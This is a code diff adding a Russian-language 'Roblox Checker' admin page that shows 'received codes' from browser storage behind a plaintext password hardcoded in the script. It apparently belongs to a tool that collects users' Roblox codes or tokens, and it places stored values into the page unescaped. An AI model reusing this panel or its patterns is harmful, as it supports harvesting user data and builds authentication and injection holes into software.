@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Админка Roblox Checker</title>
+    <style>
+        body {
+            background: #0d1117;
+            color: white;
+            font-family: Arial;
+            padding: 20px;
+        }
+        .login-form {
+            max-width: 400px;
+            margin: 100px auto;
+            text-align: center;
+        }
+        input {
+            padding: 10px;
+            margin: 10px;
+            width: 80%;
+            border-radius: 5px;
+            border: 1px solid #30363d;
+            background: #161b22;
+            color: white;
+        }
+        button {
+            padding: 10px 20px;
+            background: #238636;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid #30363d;
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background: #161b22;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form" id="loginForm">
+        <h2>🔒 Админ панель</h2>
+        <input type="password" id="password" placeholder="Пароль">
+        <button onclick="login()">Войти</button>
+    </div>
+    
+    <div id="adminPanel" style="display:none;">
+        <h2>📊 Полученные коды</h2>
+        <button onclick="loadCodes()">🔄 Обновить</button>
+        <table id="codesTable">
+            <thead>
+                <tr>
+                    <th>Время</th>
+                    <th>Код</th>
+                    <th>Длина</th>
+                </tr>
+            </thead>
+            <tbody id="codesList"></tbody>
+        </table>
+    </div>
+    
+    <script>
+        const ADMIN_PASS = 'malik0609';
+        
+        function login() {
+            const pass = document.getElementById('password').value;
+            if (pass === ADMIN_PASS) {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                loadCodes();
+            } else {
+                alert('Неверный пароль!');
+            }
+        }
+        
+        function loadCodes() {
+            const codes = JSON.parse(localStorage.getItem('roblox_codes') || '[]');
+            const tbody = document.getElementById('codesList');
+            tbody.innerHTML = '';
+            
+            codes.forEach(code => {
+                const row = tbody.insertRow();
+                row.innerHTML = `
+                    <td>${code.time}</td>
+                    <td><code>${code.code.substring(0, 50)}...</code></td>
+                    <td>${code.length}</td>
+                `;
+            });
+        }
+        
+        // Автообновление каждые 5 секунд
+        setInterval(() => {
+            if (document.getElementById('adminPanel').style.display === 'block') {
+                loadCodes();
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
